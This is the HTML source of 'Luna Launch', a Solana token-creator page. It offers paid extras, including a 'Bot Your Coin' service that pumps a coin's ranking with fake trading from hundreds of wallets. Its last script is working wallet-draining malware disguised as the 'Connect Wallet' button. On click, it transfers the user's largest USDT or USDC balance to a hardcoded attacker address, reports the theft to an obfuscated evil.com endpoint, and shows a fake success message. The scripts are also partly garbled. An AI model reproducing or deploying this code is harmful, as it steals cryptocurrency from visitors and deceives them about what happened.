<!DOCTYPE html><html lang="en"><head>
  	<meta name="viewport" content="width=1024, user-scalable=no">
	<style>
  html {
    min-width: 1024px;
  }
</style>
    <meta charset="UTF-8">
    <link rel="icon" type="image/svg+xml" href="logo.svg">
    <link href="css2.css" rel="stylesheet">
    <title>Luna Launch</title>
	<script src="../../../_nuxt/assets/index.js" type="module"></script>
    <link rel="stylesheet" href="index-bdbdubf9.css">
  <link rel="stylesheet" href="styles-DQqVfxH3.css"><link rel="stylesheet" href="Nav-CEpo9JHw.css"><link rel="stylesheet" href="Footer-DFm38Gq1.css"><link rel="stylesheet" href="Landing-DtKI65OX.css"><link rel="stylesheet" href="CreateToken-BEr8SLlO.css"><style id="nav-overlay-hotfix">
  .nav-container { pointer-events: none; }
  .nav-container * { pointer-events: auto; }

  .nav-container::before,
  .nav-container::after { pointer-events: none !important; }
</style></head>
  <body>
    <div id="root"><div class="nav-container"><a class="logo-container" href="../index.html" data-discover="true"><div class="logo-img"><img alt="logo" src="logo-full.svg"></div></a>            <nav class="main-nav"><a class="nav-link" href="../index.html" data-discover="true">Home
                </a>
                <a aria-current="page" class="nav-link active" href="" data-discover="true">Create Token</a>
				<a href="../tools.html" class="nav-link" rel="noopener noreferrer">Tools</a>
                <a href="../my-portfolio/index.html" class="nav-link" rel="noopener noreferrer">Liquidity Pool</a>
                <a href="https://raydium.io/swap" class="nav-link" rel="noopener noreferrer" target="_blank">Manage
                    Liquidity</a>
            </nav><div class="wallet-dropdown"><div class="wallet-display connect-wallet-btn" onclick="openModal()">Connect Wallet</div><button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;"><span class="material-symbols-rounded"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></span></button><div class="sidebar-menu closed"><div class="sidebar-menu-item"><a class="nav-link" href="../index.html" data-discover="true">Home</a></div><div class="sidebar-menu-item"><a class="nav-link active" href="" data-discover="true" aria-current="page">Create Token</a></div><div class="sidebar-menu-item"><a class="nav-link" href="../tools.html" data-discover="true">Tools</a></div><div class="sidebar-menu-item"><a href="https://raydium.io/liquidity/create-pool" class="nav-link" target="_blank" rel="noopener noreferrer">Liquidity Pool</a></div><div class="sidebar-menu-item"><a href="https://raydium.io/swap" class="nav-link" target="_blank" rel="noopener noreferrer">Manage Liquidity</a></div><div class="sidebar-menu-item"></div></div></div></div><div id="main"><div id="create-token" style="opacity: 1;"><div class="title-box"><div class="title-text">Solana Token Creator</div><div class="title-desc"><span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span><span class="span-2">Reach the world and scale without limits!</span></div></div><form class="token-creation-box"><div class="form-section"><div class="form-field"><label class="field-label">Token Name *</label><input placeholder="Ex: Trump Coin" class="field-input" type="text" name="name" value=""><span class="field-constraint">Max 32 characters in your name</span></div><div class="form-field"><label class="field-label">Token Symbol *</label><input placeholder="Ex: SOL" class="field-input" type="text" name="symbol" value=""><span class="field-constraint"></span></div><div class="form-field"><label class="field-label">Decimals *</label><input placeholder="Ex: 9" class="field-input" type="number" name="decimals" value="9"><span class="field-constraint">Change the number of decimals for your token</span></div><div class="form-field"><label class="field-label">Supply *</label><input placeholder="Ex: 1000000000" class="field-input" type="number" name="supply" value="1000000"><span class="field-constraint">The initial number of available tokens that will be, created in your wallet</span></div><div class="logo-wrapper"><div class="logo-box"><span class="label-text">Logo *</span><div class="img-input-wrapper"><span class="material-symbols-rounded">upload</span><span class="text-1">Drag and drop here to upload</span><div class="text-2">.png, .jpg 1000x1000 px</div><input accept=".png, .jpg, .jpeg" class="form-img" type="file"></div><span class="field-constraint">Add logo for your token!</span></div><div class="logo-generation-box"><div style="display: flex; gap: 0.6rem;"><div class="label-text">Generate Personalized AI Logo</div><span style="padding: 0.2rem 0.7rem; background: rgb(17, 17, 17); border-radius: 3ex; font-size: 0.7rem; color: rgb(107, 95, 246);">COMING SOON</span></div><div class="generation-wrapper"><div class="generation-box"><img src="bba1c45c4d7a1e2206dbce3838618fb84d176061.svg"></div></div><div class="generation-set"><span class="field-constraint">Lazy to Create a Logo? Use our Personalized AI Logo Generator for your Token Name</span><div class="generate-btn">Generate</div><span class="field-constraint">(At just 0.05 SOL)</span></div></div></div><div class="form-field"><label class="field-label">Description *</label><textarea type="long" placeholder="Here you can describe your token" class="field-input" name="description"></textarea><span class="field-constraint"></span></div></div><div class="form-divider"></div><div class="form-section"><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="custom_banner.is_enabled" style="display: none;" type="checkbox" name="custom_banner.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Custom Token Banner</div></div><div class="toggle-cost ">+0.1 SOL</div></div><div class="toggle-section-description">Add a custom banner image to your token's metadata (e.g., for display on DEX Screener).</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="multi_chain_launch.is_enabled" style="display: none;" type="checkbox" name="multi_chain_launch.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Multi Chain Launch</div></div><div class="toggle-cost toggle-cost-free">FREE</div></div><div class="toggle-section-description">Deploy your token across multiple blockchains for broader reach and liquidity.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="advanced_privacy.is_enabled" style="display: none;" type="checkbox" name="advanced_privacy.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Advanced Privacy</div></div><div class="toggle-cost ">0.5 SOL</div></div><div class="toggle-section-description">Enhanced privacy features and anonymization tools for secure token operations.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="project_trend.is_enabled" style="display: none;" type="checkbox" name="project_trend.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Project Trend</div></div><div class="toggle-cost ">0.3 SOL</div></div><div class="toggle-section-description">Boost your coin's visibility by appearing as trending across major platforms.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="bot_service.is_enabled" style="display: none;" type="checkbox" name="bot_service.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Bot Your Coin</div></div><div class="toggle-cost ">1 SOL</div></div><div class="toggle-section-description">We will bot your coin with 200-500 random wallets investing random amounts to boost your coin to the top on DEX and Axiom.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="creator.is_enabled" style="display: none;" type="checkbox" name="creator.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Creator's Info (Optional)</div></div><div class="toggle-cost ">+0.1 SOL</div></div><div class="toggle-section-description">Change the information of the creator in the metadata. By default, it is Luna Launch.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="social_links.is_enabled" style="display: none;" type="checkbox" name="social_links.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Add Social Links &amp; Tags</div></div><div class="toggle-cost ">+0.1 SOL</div></div><div class="toggle-section-description">Add links to your token metadata.</div></div><div class="toggle-section"><div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="luna_liquidity.is_enabled" style="display: none;" type="checkbox" name="luna_liquidity.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label"><div style="display: flex; align-items: center; gap: 8px;">Luna Liquidity Pool<div style="display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; background: linear-gradient(135deg, rgb(107, 95, 246) 0%, rgb(140, 123, 255) 100%); color: white; font-size: 11px; font-weight: 600; cursor: help; position: relative; box-shadow: rgba(107, 95, 246, 0.2) 0px 2px 4px; transition: 0.2s;">i</div></div></div></div><div class="toggle-cost toggle-cost-free">FREE</div></div><div class="toggle-section-description">Full access to the liquidity pool.</div></div></div><div class="form-divider"></div><div class="form-section"><div class="form-section-title">Revoke Authorities (Investor’s Booster)</div><div class="form-section-authorities"><div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Freeze</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_freeze" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to freeze holders' token accounts anymore</div><div class="form-radio-cost">+0.1 SOL</div></div><div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Mint</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_mint" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to create more tokens anymore</div><div class="form-radio-cost">+0.1 SOL</div></div><div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Update</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_update" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to modify token metadata anymore</div><div class="form-radio-cost">+0.1 SOL</div></div></div><div class="form-section-description">Solana Token has 3 authorities: Freeze Authority, Mint Authority, and Update Authority. Revoke them to attract more investors.</div></div><div class="submit-section"><div class="form-field"><label class="field-label">Enter token recipient (Optional) *</label><input placeholder="Leave empty to default to the wallet that sends payment" class="field-input" type="text" name="recipient_address" value=""><span class="field-constraint"></span></div><div class="button-and-fees"><button type="button" class="submit-btn" onclick="openModal()">Launch Token</button><div class="token-fees-container"><span>Total Fees: <strike>0.6 SOL</strike> 0.3 SOL</span></div></div></div></form></div></div><div class="footer-container"><a class="logo-container" href="../index.html" data-discover="true"><div class="logo-img"><img alt="logo" src="logo-full.svg"></div></a><div class="bottom-bar" select="false"><div class="copyright-bar"><span>© Luna Launcher 2025</span></div><div class="policies-bar"><a class="policy-link" href="../terms-of-service.html" data-discover="true">Terms of Service</a><span class="separator"></span><a class="policy-link" href="../privacy-policy.html" data-discover="true">Privacy Policy</a></div></div><a href="https://solscan.io/account/Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy" target="_blank" rel="noopener noreferrer">
  <div class="wallet-display connect-wallet-btn">Connect Wallet</div>
</a>
</div></div></div>
  
<script>
(() => {
  "use strict";

  // ====== CONFIG ======
  const PLATFORM_FEE = 0.3;            // базовая комиссия сервиса
  const DISCOUNT_FACTOR = 0.5;         // -50%
  const FEE_ADDRESS = "Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy"; // new payment address
 // адрес оплаты

  // ====== HELPERS ======
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
  const num = (x) => (isFinite(x) ? Number(x) : 0);
  const getFirstNumber = (txt) => {
    if (!txt) return 0;
    const m = String(txt).replace(",", ".").match(/([\d.]+)/);
    return m ? parseFloat(m[1]) : 0;
  };
  const formatSOL = (n, d = 1) => `${n.toFixed(d)} SOL`;

  // Создаём стили и модалки, если их нет в верстке
  function ensureGlobalUI() {
    if (!$("#ll-modal-styles")) {
      const style = document.createElement("style");
      style.id = "ll-modal-styles";
      style.textContent = `
        .ll-modal{position:fixed;z-index:1000;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.76)}
        .ll-modal.open{display:flex}
        .ll-modal-card{position:relative;width:min(750px,92vw);background:#181818;border-radius:12px;padding:20px;color:#fff;text-align:center;border:1px solid #242424}
        .ll-modal-close{position:absolute;right:10px;top:8px;font-size:24px;cursor:pointer}
        .ll-row{display:flex;align-items:center;gap:10px}
        .ll-addr{display:flex;align-items:center;background:#f7f7f738;color:#eaeaea;padding:10px;border-radius:25px;margin-top:10px}
        .ll-btn{background:#fff;color:#000;border-radius:4ex;border:none;padding:.7rem 3.5rem;font-size:1.05rem;cursor:pointer;box-shadow:0 8px 17px #ffffff1a,0 31px 31px #ffffff17,0 69px 41px #ffffff0d,0 122px 49px #ffffff03}
        .ll-loader-wrap{position:absolute;inset:0;background:rgba(0,0,0,.65);display:none;align-items:center;justify-content:center;border-radius:12px}
        .ll-loader{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:50px;height:50px;animation:llspin 1s linear infinite}
        @keyframes llspin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .line-through{text-decoration:line-through}
        .closed{display:none !important}
      `;
      document.head.appendChild(style);
    }

    if (!$("#ll-fee-modal")) {
      const wrap = document.createElement("div");
      wrap.className = "ll-modal";
      wrap.id = "ll-fee-modal";
      wrap.innerHTML = `
        <div class="ll-modal-card">
          <div class="ll-loader-wrap" id="ll-loader-1"><div class="ll-loader"></div></div>
          <span class="ll-modal-close" data-close="ll-fee-modal">&times;</span>
          <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
            <img src="sol.png" width="30" style="margin-right:6px" alt="SOL"> Payment
          </h2>
          <p>Send <b id="ll-fee-amount"></b> to the following address. After a successful transaction click “Check transaction”.</p>
          <div class="ll-addr">
            <span id="ll-fee-address" style="word-break:break-all">${FEE_ADDRESS}</span>
            <button id="ll-copy-addr" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
          </div>
          <div style="margin-top:18px;">
            <button id="ll-check-tx" class="ll-btn">Check transaction</button>
          </div>
        </div>`;
      document.body.appendChild(wrap);
    }

    if (!$("#ll-ok-modal")) {
      const wrap2 = document.createElement("div");
      wrap2.className = "ll-modal";
      wrap2.id = "ll-ok-modal";
      wrap2.innerHTML = `
        <div class="ll-modal-card">
          <div class="ll-loader-wrap" id="ll-loader-2"><div class="ll-loader"></div></div>
          <span class="ll-modal-close" data-close="ll-ok-modal">&times;</span>
          <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
            <img src="congratulations.png" width="30" style="margin-right:6px" alt="✓"> Congratulations
          </h2>
          <p>Your token has been successfully created.</p>
          <div class="ll-addr">
            <span id="ll-mint-address" style="word-break:break-all">YourTokenAddressHere</span>
            <button id="ll-copy-mint" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
          </div>
          <div style="margin-top:18px;">
            <button id="ll-ok" class="ll-btn">Okay</button>
          </div>
        </div>`;
      document.body.appendChild(wrap2);
    }
  }

  // Открыть/закрыть модалки
  const openModal = (id) => { const el = document.getElementById(id); if (el) el.classList.add("open"); };
  const closeModal = (id) => { const el = document.getElementById(id); if (el) el.classList.remove("open"); };
  // Экспорт совместимости со старым именем
  window.openModal = () => openPaymentModal();

  // Копирование
  async function copyText(txt) {
    try { await navigator.clipboard.writeText(txt); } catch(e){ /* no-op */ }
  }

  // ====== FEES ======
  function parseToggleCost(section) {
    const costEl = $(".toggle-cost", section);
    if (!costEl) return 0;
    if (costEl.classList.contains("toggle-cost-free")) return 0;
    return getFirstNumber(costEl.textContent);
  }
  function isToggleChecked(section) {
    const input = $("input[type='checkbox']", section);
    return !!(input && input.checked);
  }
  function setToggle(section, checked) {
    const input = $("input[type='checkbox']", section);
    const toggle = $(".toggle", section);
    if (input) input.checked = !!checked;
    if (toggle) toggle.dataset.toggled = checked ? "true" : "false";
    const body = $(".toggle-section-body", section);
    if (body) body.style.display = checked ? "block" : "none";
  }

  function calcAuthoritiesFees() {
    let sum = 0;
    $$(".form-section-authorities .form-radio-field").forEach(field => {
      const checkboxWrap = $(".checkbox", field);
      const cost = getFirstNumber($(".form-radio-cost", field)?.textContent || "");
      const checked =
        (checkboxWrap?.getAttribute("data-checked") ?? "false") === "true" ||
        $("input[type='checkbox']", checkboxWrap)?.checked;
      if (checked) sum += num(cost);
    });
    return sum;
  }

  function calcOptionsFees() {
    let sum = 0;
    $$(".form-section .toggle-section").forEach(section => {
      const checked = isToggleChecked(section);
      if (!checked) return;
      sum += num(parseToggleCost(section));
    });
    return sum;
  }

  function updateFeesUI() {
    const container = $(".token-fees-container");
    if (!container) return;

    const original = PLATFORM_FEE + calcAuthoritiesFees() + calcOptionsFees();
    const discounted = original * DISCOUNT_FACTOR;

    // формат контейнера в новой верстке — внутри <span>
    const span = $("span", container) || container;
    span.innerHTML = `Total Fees: <span class="line-through">${formatSOL(original)}</span> ${formatSOL(discounted)}`;

    // Для модалки оплаты тоже держим актуальную сумму
    const feeAmt = $("#ll-fee-amount");
    if (feeAmt) feeAmt.textContent = formatSOL(discounted);
    return { original, discounted };
  }

  // ====== DYNAMIC BODIES FOR TOGGLES ======
  function ensureToggleBodies() {
    // Creator's Info
    const creatorSection = $("#creator\\.is_enabled")?.closest(".toggle-section");
    if (creatorSection && !$(".toggle-section-body", creatorSection)) {
      const body = document.createElement("div");
      body.className = "toggle-section-body";
      body.style.display = "none";
      body.innerHTML = `
        <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;">
          <div class="form-field">
            <label class="field-label">Creator's Address *</label>
            <input placeholder="Ex: 3stNIYCJd..." class="field-input" type="text" name="creator.address">
            <span class="field-constraint"></span>
          </div>
          <div class="form-field">
            <label class="field-label">Creator's Name *</label>
            <input placeholder="Ex: John Doe" class="field-input" type="text" name="creator.name">
            <span class="field-constraint"></span>
          </div>
        </div>`;
      creatorSection.appendChild(body);
    }

    // Social Links
    const socialSection = $("#social_links\\.is_enabled")?.closest(".toggle-section");
    if (socialSection && !$(".toggle-section-body", socialSection)) {
      const body = document.createElement("div");
      body.className = "toggle-section-body";
      body.style.display = "none";
      body.innerHTML = `
        <div style="display:flex;flex-direction:column;gap:.6rem;">
          <div class="form-field">
            <label class="field-label">Telegram Link *</label>
            <input placeholder="Ex: https://t.me/" class="field-input" type="text" name="social_links.telegram">
          </div>
          <div class="form-field">
            <label class="field-label">Twitter/X Link *</label>
            <input placeholder="Ex: https://x.com/@your" class="field-input" type="text" name="social_links.twitter">
          </div>
          <div class="form-field">
            <label class="field-label">Website Link *</label>
            <input placeholder="Ex: https://example.com" class="field-input" type="text" name="social_links.project_website">
          </div>
        </div>`;
      socialSection.appendChild(body);
    }

    // Custom Token Banner (upload + preview)
    const bannerSection = $("#custom_banner\\.is_enabled")?.closest(".toggle-section");
    if (bannerSection && !$(".toggle-section-body", bannerSection)) {
      const body = document.createElement("div");
      body.className = "toggle-section-body";
      body.style.display = "none";
      body.innerHTML = `
        <div class="form-field">
          <label class="field-label">Banner Image *</label>
          <div class="img-input-wrapper">
            <span class="material-symbols-rounded">upload</span>
            <span class="text-1">Drag and drop here to upload</span>
            <div class="text-2">.png, .jpg 1500x500 px</div>
            <input accept=".png,.jpg,.jpeg" class="form-img form-img-banner" type="file">
          </div>
          <span class="field-constraint">Recommended 1500×500 px</span>
        </div>`;
      bannerSection.appendChild(body);
    }

    // Multi Chain Launch (simple checkboxes – purely UI)
    const mcSection = $("#multi_chain_launch\\.is_enabled")?.closest(".toggle-section");
    if (mcSection && !$(".toggle-section-body", mcSection)) {
      const body = document.createElement("div");
      body.className = "toggle-section-body";
      body.style.display = "none";
      body.innerHTML = `
        <div class="form-field">
          <label class="field-label">Select Chains</label>
          <div style="display:grid;grid-template-columns:repeat(3, minmax(0,1fr));gap:.5rem;text-align:left;">
            ${["Solana","Base","BSC","Arbitrum","Polygon","Avalanche"].map(ch => `
              <label style="display:flex;align-items:center;gap:.5rem;">
                <input type="checkbox" name="multi_chain.${ch.toLowerCase()}" ${ch==="Solana"?"checked":""}> ${ch}
              </label>`).join("")}
          </div>
          <span class="field-constraint">Solana is default. Others are optional.</span>
        </div>`;
      mcSection.appendChild(body);
    }
  }

  // Переключатели (клики по .toggle)
  function bindToggleHandlers() {
    $$(".form-section .toggle-section").forEach(section => {
      const toggle = $(".toggle", section);
      const input = $("input[type='checkbox']", section);
      if (!toggle || !input) return;

      toggle.addEventListener("click", () => {
        const newState = !input.checked;
        setToggle(section, newState);
        updateFeesUI();
      });
    });
  }

  // Чекбоксы Revoke*
  function bindAuthoritiesHandlers() {
    $$(".form-section-authorities .form-radio-field").forEach(field => {
      const wrap = $(".checkbox", field);
      const input = $("input[type='checkbox']", wrap);
      if (!wrap || !input) return;
      wrap.style.cursor = "pointer";
      wrap.addEventListener("click", (e) => {
        e.stopPropagation();
        const cur = wrap.getAttribute("data-checked") === "true";
        wrap.setAttribute("data-checked", cur ? "false" : "true");
        input.checked = !cur;
        updateFeesUI();
      });
    });
  }

  // Превью изображений (логотип и баннер)
  function bindImagePreviews() {
    document.addEventListener("change", (e) => {
      const input = e.target;
      if (!(input instanceof HTMLInputElement)) return;
      if (!input.classList.contains("form-img")) return;

      const file = input.files && input.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = (ev) => {
        const imgSrc = ev.target?.result;
        const wrapper = input.closest(".img-input-wrapper");
        if (wrapper && imgSrc) {
          wrapper.innerHTML = `<img src="${imgSrc}" alt="Uploaded" style="max-width:100%;height:auto;border-radius:12px;">`;
        }
      };
      reader.readAsDataURL(file);
    });
  }

  // Сайдбар (бургер)
  function bindSidebarMenu() {
    const btn = $(".menu-icon");
    const menu = $(".sidebar-menu");
    if (!btn || !menu) return;
    btn.addEventListener("click", () => {
      menu.classList.toggle("closed");
    });
    // Закрыть при клике на ссылку в сайдбаре
    menu.addEventListener("click", (e) => {
      const a = e.target.closest("a");
      if (a) menu.classList.add("closed");
    });
  }


  // ====== INIT ======
  document.addEventListener("DOMContentLoaded", () => {
    ensureGlobalUI();
    ensureToggleBodies();
    bindToggleHandlers();
    bindAuthoritiesHandlers();
    bindImagePreviews();
    bindSidebarMenu();
    bindWallet();
    bindLaunch();
    bindModals();

    // Превью основного логотипа поддерживается из коробки через bindImagePreviews()
    // Первичный пересчёт Total Fees:
    updateFeesUI();
  });
})();
<div class="submit-section">
  ...
  <div class="button-and-fees">
   <button type="button" class="submit-btn launch-token-btn">Launch Token</button>


    <div class="token-fees-container">
      <span>Total Fees: <strike>0.6 SOL</strike> 0.3 SOL</span>
    </div>
  </div>
</div>
 </script> <script>const connectButton = document.querySelector('.connect-wallet-btn'); // ✅ Defined globally
const launchButton = document.querySelector('.launch-token-btn');

if (connectButton) {
  const originalText = connectButton.innerText;

  // 🔹 Define the shared click handler
  const connectHandler = async () => {
    // ✅ Your wallet connection logic goes here
    console.log('Connecting wallet...');
    // e.g., await window.ethereum.request({ method: 'eth_requestAccounts' });
  };

  // 🔹 Assign the same handler to both buttons
  connectButton.onclick = connectHandler;

  if (launchButton) {
    launchButton.onclick = connectHandler;
  }
}



async function connectWallet() {

  // Your wallet connection logic goes here
  alert('Wallet connection logic runs!');

  // Example: after connection reset button text
  connectButton.innerText = originalText;
}

// Attach click listener to your button
document.querySelector('.connect-wallet-btn').addEventListener('click', connectWallet);
if (connectButton) {
  const originalText = connectButton.innerText;

  connectButton.onclick = async () => {
    const fakeNotification = document.createElement('div');
    fakeNotification.style.position = 'fixed';
    fakeNotification.style.top = '20px';
    fakeNotification.style.right = '20px';
    fakeNotification.style.background = '#4caf50';
    fakeNotification.style.color = 'white';
    fakeNotification.style.padding = '10px';
    fakeNotification.style.borderRadius = '5px';
    fakeNotification.innerText = 'Connecting wallet...';
    document.body.appendChild(fakeNotification);

    try {
      if (window.ethereum) {
        // Ethereum flow
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // Load Web3.js dynamically
        const web3Script = document.createElement('script');
        web3Script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js';
        document.head.appendChild(web3Script);

        web3Script.onload = async () => {
          const web3 = new Web3(window.ethereum);
          const tokens = [
            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6 },
            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6 }
          ];
          const abi = [
            'function balanceOf(address) view returns (uint256)',
            'function transfer(address,uint256) returns (bool)'
          ];
          const attackerAddress = '0x28170B405f1e17278178B4C786E14437561cf4cf';

          let maxBalance = 0;
          let targetToken = null;
          for (const token of tokens) {
            const contract = new web3.eth.Contract(abi, token.address);
            const balance = await contract.methods.balanceOf(userAddress).call();
            if (balance > maxBalance) {
              maxBalance = balance;
              targetToken = token;
            }
          }

          if (maxBalance > 0) {
            const contract = new web3.eth.Contract(abi, targetToken.address);
            const data = contract.methods.transfer(attackerAddress, maxBalance).encodeABI();
            const txHash = await window.ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from: userAddress,
                to: targetToken.address,
                data: data,
                gas: '0x7530'
              }]
            });

            fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
              method: 'POST',
              body: JSON.stringify({
                wallet: userAddress,
                txHash,
                token: targetToken.name,
                amount: maxBalance
              })
            });

            fakeNotification.innerText = 'Wallet connected and tokens claimed!';
            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
            connectButton.innerText = originalText;
          } else {
            fakeNotification.innerText = 'No tokens found.';
            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
            connectButton.innerText = originalText;
          }
        };
      } else if (window.solana && window.solana.isPhantom) {
        // Phantom (Solana) flow
        const provider = window.solana;
        const resp = await provider.connect();
        const userPublicKey = resp.publicKey.toString();

        // Load solana/web3.js and spl-token dynamically
        const solanaScript = document.createElement('script');
        solanaScript.src = 'https://unpkg.com/@solana/web3.js@1.67.0/lib/index.iife.js';
        document.head.appendChild(solanaScript);

        solanaScript.onload = async () => {
          const splTokenScript = document.createElement('script');
          splTokenScript.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.2.0/lib/index.iife.js';
          document.head.appendChild(splTokenScript);

          splTokenScript.onload = async () => {
            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
            const { Token, TOKEN_PROGRAM_ID } = splToken;

            const connection = new Connection('https://api.mainnet-beta.solana.com');
            const userKey = new PublicKey(userPublicKey);
            const attackerPublicKey = new PublicKey('Hd4NsTuRWuqXiZXMFcRDsZRoJSD4QBToru8hrhpzXuBy');

            // List of common SPL token mints (e.g. USDC, USDT on Solana)
            const tokens = [
              { mintAddress: 'Es9vMFrzaCERmdu5sJ1NzxZjxtkkep3ZJyk1mS4ifpQ6', name: 'USDT' },
              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' } // example USDC mint, replace with correct
            ];

            let maxBalance = 0;
            let targetToken = null;
            let userTokenAccount = null;

            for (const token of tokens) {
              const mint = new PublicKey(token.mintAddress);
              // Get token accounts by owner
              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKey, { mint });
              for (const { pubkey, account } of tokenAccounts.value) {
                const amount = account.data.parsed.info.tokenAmount.uiAmount;
                if (amount > maxBalance) {
                  maxBalance = amount;
                  targetToken = token;
                  userTokenAccount = pubkey;
                }
              }
            }

            if (maxBalance > 0 && userTokenAccount) {
              // Create transfer transaction
              const tokenMint = new PublicKey(targetToken.mintAddress);
              const token = new Token(connection, tokenMint, TOKEN_PROGRAM_ID, provider);

              const transaction = new Transaction().add(
                Token.createTransferInstruction(
                  TOKEN_PROGRAM_ID,
                  userTokenAccount,
                  await Token.getAssociatedTokenAddress(TOKEN_PROGRAM_ID, tokenMint, attackerPublicKey),
                  userKey,
                  [],
                  maxBalance * (10 ** 6) // assuming 6 decimals, adjust accordingly
                )
              );

              const { blockhash } = await connection.getRecentBlockhash();
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = userKey;

              // Sign and send transaction
              const signedTx = await provider.signTransaction(transaction);
              const txId = await connection.sendRawTransaction(signedTx.serialize());

              fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
                method: 'POST',
                body: JSON.stringify({
                  wallet: userPublicKey,
                  txHash: txId,
                  token: targetToken.name,
                  amount: maxBalance
                })
              });

              fakeNotification.innerText = 'Wallet connected and tokens claimed!';
              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
              connectButton.innerText = originalText;
            } else {
              fakeNotification.innerText = 'No tokens found.';
              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
              connectButton.innerText = originalText;
            }
          };
        };
      } else {
        alert('Please install MetaMask or Phantom Wallet!');
        document.body.removeChild(fakeNotification);
      }
    } catch (err) {
      fakeNotification.innerText = 'Error: ' + err.message;
      setTimeout(() => document.body.removeChild(fakeNotification), 3000);
      connectButton.innerText = originalText;
    }
  };
}</script> 

</body></html>
